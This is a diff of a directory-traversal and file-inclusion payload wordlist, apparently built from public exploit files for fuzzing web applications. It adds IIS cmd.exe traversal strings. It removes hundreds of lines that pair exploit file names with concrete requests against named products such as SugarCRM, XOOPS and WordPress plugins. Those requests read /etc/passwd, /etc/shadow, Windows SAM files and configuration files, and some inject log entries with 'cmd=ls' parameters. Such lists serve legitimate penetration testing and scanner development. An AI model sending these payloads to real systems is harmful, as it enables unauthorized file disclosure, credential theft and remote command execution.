@@ -52,12 +52,10 @@
 !upload
 !ut
 !webtrends
-# EG
-# Original write-up
-###    /XPWeb_v3.3.2/Download.php?url=../../../../../../../etc/passwd
 #admin/system/api
 #http
-$file="admin_xs.php?phpEx=../../../../../../../../../../../../../../../../etc/passwd%00";
+$iny="agregar_info.php?tabla=../../../../../../../../../../../../../../../../etc/passwd%00";
+$vector_ataque[11]="/MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 %%-13^%%-135052920^header.tpl.php
 %%-14^%%-1407541581^method.tpl.php
 %%-19^%%-1910644431^basicindex.tpl.php
@@ -295,10 +293,14 @@ $file="admin_xs.php?phpEx=../../../../../../../../../../../../../../../../etc/pa
 ..%252f..%252f..%252f..%252f..%252f../windows/repair/sam
 ..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam
 ..%252f..%252f..%252f..%252f..%252f../winnt/repair/sam._
+..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
 ..%255c..%255c..%255c..%255c..%255c../windows/repair/sam
 ..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam
 ..%255c..%255c..%255c..%255c..%255c../winnt/repair/sam._
+..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+
+..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 ..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
+..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 ..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
 ..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
@@ -9505,324 +9507,6 @@ $file="admin_xs.php?phpEx=../../../../../../../../../../../../../../../../etc/pa
 ./././././././././././boot.ini
 ./././././././././././etc/passwd
 ./././././././././././etc/shadow
-./11723.pl:/cgi-bin/ttx.cgi?cmd=file&fn=../../../../../../etc/passwd
-./1214.php:/include/security.inc.php?cmd=".urlencode($command)."&l=".urlencode("../../../members/uploads/".$subdir."/".$filename.chr(0x00))
-./1226.php:/index.php?cmd=
-./1244.pl://phpMyAdmin-2.6.4-pl1/ ../../../../../etc/passwd
-./12510.php:/admin.php?op=modifyUser
-./1315.php:/xoops/class/xoopseditor/dhtmltextarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../boot.ini%00
-./1315.php:/xoops/class/xoopseditor/dhtmltextarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../script
-./1315.php:/xoops/class/xoopseditor/koivi/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../boot.ini%00
-./1315.php:/xoops/class/xoopseditor/koivi/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../script
-./1315.php:/xoops/class/xoopseditor/textarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../boot.ini%00
-./1315.php:/xoops/class/xoopseditor/textarea/editor_registry.php?xoopsConfig[language]=../../../../../../../../../../script
-./13810.php:/notify.php?v=a/ ../../../../../../../../etc/passwd
-./1485.php:/modules/newbb_plus/class/class.forumposts.php?bbPath[path]=../../../../../../../../etc/passwd%00
-./1485.php:/modules/newbb_plus/class/class.forumposts.php?cmd=ls%20-la&bbPath[path]=../../../../../../test.php%00
-./1485.php:/modules/newbb_plus/class/class.forumposts.php?cmd=ls%20-la&bbPath[path]=[how far from runcms root?]../../../UserFiles/File/shell.inc%00
-./1485.php:/modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]=../../../../../../../../etc/passwd%00
-./1485.php:/modules/newbb_plus/class/forumpollrenderer.php?cmd=ls%20-la&bbPath[path]=../../../../../../test.php%00
-./1485.php:/modules/newbb_plus/class/forumpollrenderer.php?cmd=ls%20-la&bbPath[path]=[how far from runcms root?]../../../UserFiles/File/shell.inc%00
-./15041.py:/maian_gallery/
-./15130.sh:/cgi-mod/view_help.cgi?locale=/../../../../../../../mail/snapshot/config.snapshot%00
-./1522.php:/html/footer.php?_SESSION[nocc_theme]=../../../../../../../../etc/passwd%00
-./1522.php:/index.php?lang=../../../../../../../../../../../../etc/passwd%00
-./1522.php:/index.php?theme=../../../../../../../../../../../etc/passwd%00
-./1527.pl:/?Lang=../../../../../../../../etc/passwd%00
-./1533.php:/index.php?template=../../../../../../../etc/passwd%00
-./15711.pl:/help.php?module=../../../../../../../../../../logs/access.log
-./15711.pl:/help.php?module=../../../../../../../../../../logs/error.log
-./15711.pl:/help.php?module=../../../../../../../../../../var/log/access_log
-./15711.pl:/help.php?module=../../../../../../../../../../var/log/apache/error.log
-./15711.pl:/help.php?module=../../../../../../../../../../var/log/apache/error_log
-./15711.pl:/help.php?module=../../../../../../../../../../var/log/httpd/access.log
-./15711.pl:/help.php?module=../../../../../../../../../../var/log/httpd/access_log
-./15711.pl:/help.php?module=../../../../../../../../../../var/log/httpd/error.log
-./15711.pl:/help.php?module=../../../../../../../../../../var/log/httpd/error_log
-./1575.pl:/index.php?include_files[]=&include_files[1]=/var/log/httpd/access_log
-./1581.pl:/install05.php?blog_language=../../../../../../etc/passwd%00
-./1581.pl:/install05.php?blog_language=../../../../../../var/log/httpd/access_log%00&cmd=ls%20-la
-./15838.php://openclassifieds/?location=%26%23039;/**/or/**/sleep(10)/**/or/**/1=%26%23039;
-./1588.php:/index.php?node=system&op=../../../cache/ext/statman/log.gtdat%00
-./1588.php:/index.php?node=system&op=blockop&block=3&bop=../../../../cache/ext/statman/log.gtdat%00
-./1588.php:/index.php?node=system&op=extop&ext=statman&eop=../../../../cache/ext/statman/log.gtdat%00
-./1595.php:/index.php?setLang=suntzu&lang[suntzu][file]=../../../../../../../../../../../var/log/httpd/access_log
-./16246.py:# value of '1'. If the attacker calls the configuration.php with a null byte (../../../../configuration.php%00) then the unlink() will be 
-./16246.py:/administrator/components/com_xcloner-backupandrestore/cloner.cron.php?config=../../../../../../../../etc/passwd
-./16246.py:/wp-content/plugins/xcloner-backup-and-restore/cloner.cron.php?config=../../../../../../../../etc/passwd
-./1627.php:/claroline/document/rqmkhtml.php?cmd=rqEditHtml&file=/../../claroline/inc/conf/claro_main.conf.php
-./1627.php:/claroline/learnPath/include/scormExport.inc.php?cmd=ls-la&includePath=/../../../../apache/logs/access.log%00
-./1659.php:/phplist/lists/index.php?GLOBALS[developer_email]=1&GLOBALS[database_module]=../../../../../../etc/passwd
-./1663.php:/doc/index.php?s=../../../../var/httpd/logs/error_log%00
-./1666.php:  Cookie: php121un=%27UNION+SELECT+%27..%2F..%2F..%2Fetc%2Fpasswd%00%27+FROM+php121_users%2F%2A; php121pw=suntzu;
-./16904.rb:/user/index.php../../../../../../../../../../etc/passwd%00
-./16961.py:/ncms/
-./16980.py:/ncms/index.php?cmd=&newlang=../../../../../../../../../../../../etc/passwd%00'
-./17367.html:/index.php?-action=../../../../../../etc/passwd%00
-./17378.py:/modules/code/syntax_check.php?rm=..%2f..%2f..%2f..%2f..%2f..%2f' + file + '%00 HTTP/1.1\r\n'
-./1738.php:/help/index.php?help_file=../../../../../../etc/passwd
-./1760.php:/infusions/last_seen_users_panel/last_seen_users_panel.php?cmd=ls%20-la&settings[locale]=../../../../images/avatars/suntzu[1].jpg%00
-./1760.php:/infusions/last_seen_users_panel/last_seen_users_panel.php?settings[locale]=../../../../../../../../../etc/passw%00
-./1760.php:/setup.php?localeset=../../../../../../../../../../etc/passwd%00
-./1777.php:/bb_lib/abbc.css.php?design_path=../../../../../../../../../etc/passwd%00
-./1777.php:/unb_lib/abbc.css.php?ABBC[Config][smileset]=../../../../../../../../../etc/passwd%00
-./1785.php:/include/SubPanel/SubPanelViewer.php?GLOBALS[sugarEntry]=1&module=1&record=1&beanList[1]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Accounts/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Administration/CustomizeFields.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Administration/Development.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Administration/DstFix.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Administration/RebuildAudit.php?GLOBALS[sugarEntry]=1&beanFiles[1]=../../../../../../../../../../../../../etc/passwd
-./1785.php:/modules/Administration/Upgrade.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Administration/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Bugs/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Calendar/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Calls/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/CampaignLog/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/CampaignTrackers/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Campaigns/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Campaigns/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Cases/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Contacts/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Dashboard/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Documents/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Dropdown/Popup.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Dropdown/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/DynamicFields/Popup.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/EditCustomFields/EditView.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/EditCustomFields/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/EmailMan/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/EmailTemplates/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Emails/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Feeds/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Home/PopupSugar.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Leads/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/MailMerge/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Meetings/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Notes/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Opportunities/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/OptimisticLock/LockResolve.php?GLOBALS[sugarEntry]=1&_SESSION[o_lock_object]=1&_SESSION[o_lock_module]=1&beanList[1]=1&beanFiles[1]=../../../../../../../../etc/passwd
-./1785.php:/modules/Project/Forms.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Project/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/ProjectTask/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/ProspectLists/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Prospects/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Roles/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Tasks/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Users/Login.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1785.php:/modules/Users/index.php?GLOBALS[sugarEntry]=1&theme=../../../../../../../../../../../../etc/passwd%00
-./1811.php:/index.php?cmd=ls%20-la&xoopsOption[nocommon]=1&xoopsConfig[theme_set]=../../../../../../../../../../var/log/httpd/error_log%00
-./1811.php:/misc.php?cmd=ls%20-la&xoopsOption[nocommon]=1&xoopsConfig[language]=../../../../../../../../../../var/log/httpd/access_log%00
-./1816.php:/nucleus/libs/PLUGINADMIN.php?GLOBALS[DIR_LIBS]=/var/log/httpd/access_log%00&cmd=ls%20-la
-./18248.pl:/examples/show_code.php?filename=example03_LRVS.php/../../../../../../../../etc/passwd
-./1853.php:/pppblog/ ../../../../../../etc/passwd
-./1857.pl:/profile.php?cmd=&action=view&uname=../../../../../../../../../var/log/httpd/error_log%00
-./1901.pl:/index.php?cmd=&post=../../../../../../../../../etc/passwd
-./1964.php:/geeklog/fckeditor/editor/filemanager/browser/mcpuk/connectors/php/connector.php?Command=FileUpload&Type=File
-./20301.php:$vector_ataque[11]="/MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20301.php:/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20301.php:/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20301.php:/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+
-./20301.php:/_vti_cnf/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20301.php:/adsamples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20301.php:/cgi-bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20301.php:/iisadmpwd/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20301.php:/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20301.php:/samples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20301.php:/scripts/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/MSADC/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/MSADC/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/PBServer/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/PBServer/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/Rpc/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/Rpc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/_mem_bin/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/_mem_bin/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/_mem_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/_mem_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+
-./20302.pl:/_mem_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/_mem_bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/_vti_bin/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/_vti_bin/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+
-./20302.pl:/_vti_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/_vti_bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/_vti_cnf/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/adsamples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/cgi-bin/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/cgi-bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/cgi-bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/iisadmpwd/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/iisadmpwd/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/includes/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/msadc/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/msadc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/samples/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/samples/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/samples/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/scripts/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
-./20302.pl:/scripts/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20302.pl:/scripts/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
-./20669.py:/gwebmail/?module=../../../../etc/passwd%00
-./20838.c:/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+
-./21558.txt/cgi-bin/magiccard.cgi?pa=preview&next=custom&page=../../../../../../../../../../etc/passwd
-./21966.txt/cgi-bin/mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00
-./21979.txt/cgi-bin/ion-p?page=../../../../../etc/hosts
-./2231.php:/smf/
-./22377.txt/k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor
-./2252.pl:/index.php?cmd=&lng=../../../../../../../../../etc/passwd%00
-./2261.php:/iziContents//include/rssfunctions.php?GLOBALS[modules_home]=../../../../../../etc/passwd
-./2266.txt/scripts/cbag/ag.exe?page=FileDownload&id=../../../../../../../../../../../../../inetpub/scripts/cbag/cb5/data/admin&notimecard=1&type=text&subtype=html&ct=1
-./2266.txt/scripts/s360v2/s360.exe?page=FileDownload&id=../../../../../../../../../../inetpub/scripts/s360v2/s360v2/data/admin&type=text&subtype=plain&ct=1&.txt
-./2266.txt/scripts/s360v2/s360.exe?page=MessageDownload&mid=37&id=../../../../../../../../../../inetpub/scripts/s360v2/s360v2/data/admin&bc=1&type=text&subtype=plain&ct=1&.txt
-./2270.php:/phpGroupWare/calendar/inc/class.holidaycalc.inc.php?GLOBALS[phpgw_info][user][preferences][common][country]=../../../../../../../../../etc/passwd%00
-./2288.php:/tikiwiki/ cat ./../../db/local.php -p81
-./2299.php:/proxima/modules/Forums/bb_smilies.php?name=../../../../../../etc/passwd%00
-./23085.html:value="../../../../../../../../../../etc/passwd">
-./2322.php:/wiki/
-./23467.txt/quikstore.cgi?category=blah&template=../../../../../../../../../../../../etc/hosts
-./23467.txt/quikstore.cgi?category=blah&template=../../../../../../../../../../../../usr/bin/id
-./23467.txt/quikstore.cgi?category=blah&template=../../../../../../../../../../etc/passwd%00.html
-./23613.txt/directory/blog.cgi?submit=ViewFile&month=[month]&year=[year]&file=/../../../../../../../../../../../../../../../../etc/passwd
-./23615.txt/directory/PJreview_Neo.cgi?p=/../../../../../../../../../../../../../../../../etc/passwd
-./23705.txt/directory/gotopage.cgi?13686+/../../../../../../../../../../../../../../../../etc/passwd
-./23706.txt/directory/genindexpage.cgi?13687+Home+/../../../../../../../../../../../../../../../../etc/passwd
-./23894.txt/cloisterblog/journal.pl?syear=2004&sday=11&smonth=../../../../../../../../etc/passwd%00
-./24561.txt/piwigo/install.php?dl=/../../local/config/database.inc.php
-./24591.txt/cgi-bin/pdesk.cgi?lang=../../../../../../../proc/version%00
-./24703.txt/lstat/lstat.cgi?obj=wg104&template=../../../../../../../../etc/passwd&from=-1m&to=now
-./2473.c:/forum/index.php?act=module&module=gallery&cmd=viewimage&img=&file_type=&dir=../../../../../../etc/passwd
-./2473.c:/index.php?act=module&module=gallery&cmd=viewimage&img=&file_type=&dir=../../../../../../etc/passwd
-./2500.pl:/phpMyAgenda/templates/header.php3?language=../../../logs/access.log 
-./25041.txt/cgi-bin/eboard40/index2.cgi?frames=yes&board=demo&mode=Current&threads=Collapse&message=../../../../../../../../../../../etc/passwd%00
-./25170.cpp:/admin/admin_styles.php?mode=addnew&install_to=../../../../../../../../../../../../../../../../../../../tmp&sid=";
-./2527.c:/index.php/../../../../../../../../../etc/passwd
-./25304.py:/WikiSandBox?action=twikidraw&do=modify&target=../../../../moin.wsgi" % target, cookies=jar)
-./25304.py:/WikiSandBox?action=twikidraw&do=modify&target=../../../plugin/action/moinexec.py" % target, cookies=jar)
-./25304.py:/WikiSandBox?action=twikidraw&do=save&ticket=%s&target=../../../../moin.wsgi" % (target, ticket_hash)
-./25304.py:/WikiSandBox?action=twikidraw&do=save&ticket=%s&target=../../../plugin/action/moinexec.py" % (target, ticket_hash)
-./25649.txt/ShowAlbum?ShowDetails&1&nocount&/../../../../../../../../../..//etc/passwd
-./25649.txt/ShowGraphic?/../../../../../../../../etc/passwd
-./25649.txt/ShowVideo?1&fullnocount&/../../../../../../../../../..//etc/passwd
-./25681.php:$out = "POST /$folder/comments.php?mid=post&id=/../../templates/headline_temp 
-./2575.php:$logs = array("../../../../../var/log/httpd/access_log
-./26914.txt/server.np?base&site=XXXintra&catalog=catalog&template=../../../../../../../../../boot.ini
-./2702.php:/classes/index.php?siteconf[curl]=../../../db/comments/news/".$comments_id."%00
-./2707.php:/lang=../../../../../../../../../etc/passwd%00
-./2711.php:/e107language_e107cookie=../../../../../../../../../etc/passwd%00
-./27141.txt/cgi-bin/e-cms/vis/vis.pl?s=../../../../etc/passwd%00
-./27141.txt/cgi-bin/e-cms/vis/vis.pl?s=001&p=../../../../etc/passwd%00
-./27163.txt/pkmslogout?filename=../../../../../../../etc/passwd
-./2758.php:/login.php
-./27880.pl:/popup.php?read=../../../../../../../../../etc/passwd
-./28124.pl: /MKPortal/ ../../../../../../../../../../../../etc/passwd
-./28124.pl:/index.php?ind=../../../../../../../../../../../../etc/passwd%00
-./28488.php:/[Proxima_path]/modules/Forums/bb_smilies.php?name=../../../../../../etc/passwd%00
-./2863.php:/kubix/../../../../../etc/passwd
-./2863.php:Es: ../../../../../../etc/passwd%00
-./2889.pl:/categories.php?config[db_type]=../../../../../../../../../../../etc/passwd%00        #
-./28960.py:/bugs/report.php?lang=../../../../../etc/passwd
-./29289.php:/infusions/fusion_forum_view/fusion_forum_view.php?settings[locale]=../../../../config.php
-./2937.php:/infusions/fusion_forum_view/fusion_forum_view.php?settings[locale]=../../../../config.php
-./29898.txt;/login.php3?login_name=x&passwd=x&locale_id=../../../../../../../../boot.ini%00.jpg
-./30199.txt/webif/webif.cgi?cmd=query&config=conf_2000/config.txt&outconfig=../../../../etc/issue
-./30478.txt/mbb/?mod=../../../../../../../../../../../../../[file]%00
-./30478.txt/mbb/?ref=../../../../../../../../../../../../../[file]%00
-./31025.txt/index.cgi?page=../../../../../../../../etc/passwd%00
-./3134.php:/kgbmod/sesskglogadmin.php?sesloga=1&skinnn=../../kg/wpisy.txt%00
-./32368.txt/servlet/downloadReport?reportFileName=../../../../../../../../etc/passwd&format=CSV
-./32632.php:/frontend/x3/fantastico/index.php?sup3r=../../../../../../etc/passwd%00 .
-./33447.php:/index.php?page=main
-./33636.sh:/knowledge_base ../../../ file.php
-./33832.txt;/helppage.php?page=../../../../etc/passwd%00
-./33913.html:/admin/includes/applications/services/pages/uninstall.php?module=../../../../../../../../cmd
-./34518.txt/statusUpdate?actionToCall=LFU&customerId=1337&fileName=../../../../../../shell.jsp&configDataID=1
-./34794.txt/cgi-bin/read.cgi?page=../../../../../../../../../../../etc/passwd%00
-./34934.pl:/agregar_info.php?tabla=../../../../../../../../../../../../../../../../etc/passwd%00";
-./35578.sh:# and prepending it with the normal directory traversal pattern ../../../ using concat()
-./35588.rb:/omc/pme/index.php
-./3622.php:/admin/main.php?sid=../../../../../../windows/temp/phpFFFF.tmp%00
-./36994.txt/wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd
-./37054.py:/_plugin/%s/../../../../../../etc/passwd
-./37398.php:/zimplit.php?action=load&file=../../../../../../../[ LFI ]%00' method='post'>
-./37637.pl:/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
-./38030.php:http://targetIP/ganglia/graph.php?g=../../../../tmp/attack&metric=DUMMY&title=DUMMY
-./38071.rb:/yeswiki/wakka.php?wiki=PagesACreer/edit&theme=yeswiki&squelette=/../../../../../../../../../../../../etc/passwd&style=gray.css&bgimg=&newpage=1
-./38071.rb:uri.query = URI.encode_www_form({"wiki"=>"PagesACreer/edit","newpage"=>"1","style"=>"gray.css","bgimg"=>"","squelette"=>"/../../../../../../../../../../../../#{downfile}","theme"=>"yeswiki"})
-./38665.txt/yeswiki/wakka.php?wiki=HomePage/diaporama&template=/../../../../../../../../../../../../etc/passwd
-./3867.pl:/theme/acgv.php?rubrik=../../../etc/passwd%00
-./38942.txt;/?action=showHome&language=../../../../../../../../../../etc/passwd%00.jpg
-./38942.txt;/index.php?action=userLogin&language=../../../../../../../../../../etc/passwd.jpg
-./38942.txt;/multiadmin/js/lib/?action=../../../../../../../../../../etc/passwd&language=de
-./39254.html:/wp-content/plugins/wp-copysafe-pdf/lib/uploadify/uploadify.php
-./39281.txt;/user.php?action=../../../windows/win.ini%00.jpg
-./39871.txt/scr.cgi?fname=../../../../../etc/passwd%00&status=
-./40229.txt/servlets/FetchFile?fileName=../../../etc/shadow
-./4076.php:/MiniBB/../../../../../etc/passwd 
-./4076.php:/MiniBB/../../../../../windows/php.ini 
-./4171.pl:my $post = "action=Load&archives=../../../../../../../../../etc/passwd%00
-./41774.py:# Advisory and description of the complete scenario: /rioru.github.io/pentest/web/2017/03/28/from-unauthenticated-to-root-supervision.html
-./41828.php
-./42093.py:# Source: /www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/
-./42402.rb:path = "../../../../../../../../../../Program Files\\Apache Software Foundation\\logs\\"
-./42402.rb:path = "../../../../../../../../../../Program%20Files\\Advantech\\SUSIAccess%203.0%20Server\\Setting.xml"
-./42452.py:/preview.php
-./42638.py:/preview.php
-./43065.py:like this one /www.pluginvulnerabilities.com/2017/07/24/wordpress-plugin-for-use-in-testing-for-php-object-injection/
-./4378.html:/code/getgalldata.php
-./44361.rb:/api/homematic.cgi
-./44520.html:/wp-admin/admin-ajax.php?action=wpie_remove_export_entry
-./44544.php:/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
-./4926.pl:$iny="agregar_info.php?tabla=../../../../../../../../../../../../../../../../etc/passwd%00";
-./5204.py:"/include/doc/get_image.php?lang=&img=../../../../../etc/passwd"
-./5304.txt/cgi-bin/his-webshop.pl?t=../../../../../../../../etc/passwd%00
-./5434.pl:/pages/print/default/ops/news.php?id=1&lang=../../../../../etc/passwd%00
-./5655.pl:/page.php?page=../../../../../etc/passwd%00
-./5700.html:/index.php?sl=../../../../../../../etc/passwd%00
-./5896.txt;/cmsmini/view/?path=../../../../../../../../boot.ini%00&p=index.html
-./5896.txt;/cmsmini/view/?path=cwh&p=../../../../../../../../boot.ini%00.html
-./6.php:/wordpress/ your_username password cat ./../../../wp-config.php 
-./7012.txt/webadmin/index.php?index.php?page=background/../../../../../../../../../Program+Files/hmailserver/Bin/hmailserver.ini%00
